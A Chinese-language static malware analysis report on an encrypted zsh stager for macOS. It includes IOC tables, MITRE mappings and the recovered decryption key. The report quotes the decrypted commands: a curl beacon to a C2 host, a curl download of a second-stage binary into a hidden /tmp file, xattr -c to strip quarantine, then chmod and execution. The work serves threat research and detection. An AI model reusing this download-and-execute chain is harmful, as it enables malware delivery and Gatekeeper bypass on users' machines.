---
title: "恶意样本分析：macOS infostealer stager (unattributed)（other · zsh · b27ed709）"
published: 2026-11-09
draft: false
description: "恶意（置信度低）：macOS infostealer stager (unattributed) · loader/downloader · 难度 easy · 纯静态分析"
tags: ["macOS infostealer", "loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **macOS infostealer stager (unattributed)**（存疑） · 置信度 **低**
> 
> 别名：AMOS / Atomic macOS Stealer delivery (candidate)、MacSync / Banshee-style macOS loader (candidate)
> 
> 样本是一个经过 AES-128-CTR + gzip 两层封装的 zsh 投放器。离线解密后可直接读到其完整逻辑：向 maplemesh9[.]com 回传粘贴/投放遥测，从 quill-95[.]com 下载二阶 Mach-O 到 /tmp 隐藏文件，用 xattr -c 去除 macOS quarantine 标记，chmod +x 后立即执行。该组合是典型的 macOS 恶意软件投放链，无任何正常软件会以随机域名、隐藏临时文件、清除隔离属性的方式自更新。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **macOS infostealer stager (unattributed)** · 别名 AMOS / Atomic macOS Stealer delivery (candidate)、MacSync / Banshee-style macOS loader (candidate) · _存疑_ |
| 置信度 | **低** |
| 行为类 | loader · downloader |
| 难度 | easy |
| 首次出现 | 2026-11-06 16:27:20 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/b27ed7098a0a1bdd78b4bbf03dff9a69e90f341b1930ab9330687813b990257b/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解密内置配置</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">回传投放遥测</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">下载二阶段载荷</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">隐藏文件暂存</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1564.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">去除隔离属性</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1553.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `b27ed7098a0a1bdd78b4bbf03dff9a69e90f341b1930ab9330687813b990257b` |
| MD5 | _未记录_ |
| 大小 | 2,690 字节（2.6 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **8** 条行为，每条都挂了证据，且全部静态可得。

### 1. 解密内置配置

`T1027` · 置信度 **高** · 静态

将 _schema_id/_build_tag/_license_salt/_cache_seed/_feature_flags 五个十六进制常量拼接，经 xxd -r -p 还原、以 MD5(385) 为密钥做 AES-128-CTR(IV=0) 解密并 gunzip，最后 eval 执行。

> **证据**：原文件 offset 2399-2679：_blob=(...); _k=$(printf '%s' "$_kb" | md5); openssl enc -d -aes-128-ctr -K "$_k" -iv 0; gunzip; eval "$_r"
> 
> **来源**：`ref:0c0295c59a` · `ref:55f89546ba`

### 2. 回传投放遥测

`T1071.001` · 置信度 **高** · 静态

脚本启动后立即以 curl 向 maplemesh9[.]com 的 /api/metrics/run?event=pasted 发送 POST，携带 user 与 BuildID 两个活动标识头，用于统计投放是否成功，属 C2 信标性质。

> **证据**：解密后阶段一(sha256 889521c4...c58e)：curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST -H 'user: AgLa...' -H 'BuildID: AgJt...' hxxps://maplemesh9[.]com/api/metrics/run?event=pasted
> 
> **来源**：`ref:55f89546ba`

### 3. 下载二阶段载荷

`T1105` · 置信度 **高** · 静态

使用 curl -fsSL 从 quill-95[.]com 的随机路径下载二阶段 Mach-O 到临时文件，下载成功后才继续后续步骤。

> **证据**：解密后阶段一：curl -fsSL -o /tmp/.l22o07b.$$ hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv && mv ...
> 
> **来源**：`ref:55f89546ba`

### 4. 隐藏文件暂存

`T1564.001` · 置信度 **高** · 静态

把载荷写成 /tmp/.l22o07b.$$(带 PID 的隐藏点文件)再重命名为 /tmp/.l22o07b，避免显眼文件名并绕过简单告警规则。

> **证据**：解密后阶段一：j68kpq=/tmp/.l22o07b.$$ ; huwtxe=/tmp/.l22o07b ; mv ${j68kpq} ${huwtxe}
> 
> **来源**：`ref:55f89546ba`

### 5. 去除隔离属性

`T1553.001` · 置信度 **高** · 静态

执行 xattr -c 清除下载文件的 com.apple.quarantine 扩展属性，绕过 macOS Gatekeeper 对下载程序的首次运行拦截。

> **证据**：解密后阶段一：gqmoi=$(printf 八进制转义) 解码为 xattr ; ${gqmoi} -c ${huwtxe}
> 
> **来源**：`ref:55f89546ba`

### 6. 赋予执行权限

`T1222.002` · 置信度 **高** · 静态

对下载的临时文件执行 chmod +x，使其成为可执行文件。

> **证据**：解密后阶段一：bhgh3=$(printf 八进制转义) 解码为 chmod ; ${bhgh3} +x ${huwtxe}
> 
> **来源**：`ref:55f89546ba`

### 7. 执行下载载荷

`T1059.004` · 置信度 **高** · 静态

下载、去隔离、加权限全部完成后，直接调用 /tmp/.l22o07b 执行二阶段程序；执行前再次向 event=stager 回传遥测。

> **证据**：解密后阶段一最后一行：... && { curl ... event=stager & } && ${huwtxe}
> 
> **来源**：`ref:55f89546ba`

### 8. 伪装维护脚本

`T1036` · 置信度 **中** · 静态

大量定义 _log/init complete/nothing to prune/state saved 等无害日志与 _pager/_color/_version 变量，并以日志组件、探针配置等命名混淆真实用途。

> **证据**：原文件 offset 30-1120：_log 函数、'init complete'、'nothing to prune'、_pager=more、_color=auto、_version=v6.0.4；解密阶段亦保留 _log 与 dev/null 变量
> 
> **来源**：`ref:0c0295c59a` · `ref:55f89546ba`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 443 | download | 静态 | ⏳ 未观测 |
| http | `hxxps://maplemesh9[.]com/api/metrics/run?event=pasted` | 443 | panel | 静态 | ⏳ 未观测 |
| http | `hxxps://maplemesh9[.]com/api/metrics/run?event=stager` | 443 | panel | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/.l22o07b.$$`
- `/tmp/.l22o07b`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `quill-95[.]com, maplemesh9[.]com` | 是 | 静态 |
| `download_url` | `hxxps://quill-95[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 是 | 静态 |
| `telemetry_url` | `hxxps://maplemesh9[.]com/api/metrics/run?event=pasted ; hxxps://maplemesh9[.]com/api/metrics/run?event=stager` | 是 | 静态 |
| `http_header_user` | `AgLa7s9n3uFA-V1OVpdHKxs28kZraGwl1HqYXCp1qMBBtg7-mfho (pasted) / AgLamIZ4Ojni6AWsJfu7A5IH165mzshBCVSLGpHFOlSMp9vauwCx (stager)` | 是 | 静态 |
| `http_header_buildid` | `AgJt3GXjbJAMxdvNno45OnW2iP8ggXdBu7O5qUTWTLC5hoE (pasted) / AgIFS62a5679cmW6eOVFScqH2TKpBiQBADgeEheb0LpU5aM (stager)` | 是 | 静态 |
| `staging_path` | `/tmp/.l22o07b.$$ -> /tmp/.l22o07b` | 是 | 静态 |
| `encryption_algo` | `AES-128-CTR (key=MD5(385), zero IV) then gzip; payload evaluated with eval` | 是 | 静态 |
| `key_derivation` | `_kb = 2*157 + 2%69 + 69 = 385; key = md5('385') = dc912a253d1e9ba40e2c597ed2376640` | 是 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能声称已下载、运行或分析到二阶段 Mach-O 载荷——本次仅恢复阶段一脚本，未获取二阶段文件。
- 不能断言该样本属于 AMOS/Atomic Stealer、MacSync 或 Banshee 等具体家族——缺少二阶段与家族专属标记。
- 不能声称 C2 已上线或遥测已成功回传——全程未联网，仅从脚本中静态恢复 URL。
- 不能声称该脚本可在 Windows 上直接运行——其依赖 zsh、xattr 语义，面向 macOS。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 是（stage2 `889521c4ec216e477e3813836630f297e401f34ce6f4f169f52279153ca0c58e`） |

**局限与待验证**

1. 该格式没有可用的隔离动态通道，且规则禁止在宿主执行样本，因此全程为静态分析，reproduced=false。
2. 默认无网络，未访问 quill-95[.]com / maplemesh9[.]com，二阶段载荷与 C2 实际响应不可得。
3. 二阶段缺失导致无法确认最终载荷类型（窃密器/后门）与具体家族归属。
4. 遥测头 user/BuildID 的生成规则与 campaign 映射未知，仅能作为活动标识记录。
5. xattr -c 针对 macOS quarantine；脚本在非 macOS 环境无法按原语义运行。

## 证据索引

<details>
<summary>展开 2 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 静态字符串提取：41 条 ASCII 字符串，定位加密常量、md5/xxd/openssl/gunzip 分片及 eval 管线（offset 0-2679）。 |
| `ev-000002` | evidence.record | 离线复算解密：MD5(385) 为 AES-128-CTR 密钥，解出 1686 字节阶段一 zsh（sha256 889521c4...c58e），含 quill-95[.]com 下载 URL、maplemesh9[.]com 遥测 URL、/tmp/.l22o07b 暂存、xattr -c、chmod +x 与执行命令。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
